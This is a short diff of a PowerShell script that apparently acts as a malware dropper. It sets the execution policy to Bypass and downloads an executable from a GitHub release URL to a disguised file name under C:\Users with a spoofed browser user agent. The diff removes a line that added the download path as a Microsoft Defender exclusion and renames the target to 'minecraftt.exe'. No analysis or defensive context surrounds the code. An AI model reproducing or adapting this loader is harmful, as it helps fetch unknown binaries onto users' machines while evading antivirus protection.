@@ -21,8 +21,7 @@ $env:PSExecutionPolicyPreference = "Bypass"
 
 
 $url = "https://github.com/galarol/checker/releases/download/123/123.exe"
-$outputFile = "C:\Users\minecroft.exe"
-Add-MpPreference -ExclusionPath $outputFile
+$outputFile = "C:\Users\minecraftt.exe"
 Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64"
 #$webClient = New-Object System.Net.WebClient
 #$webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64")
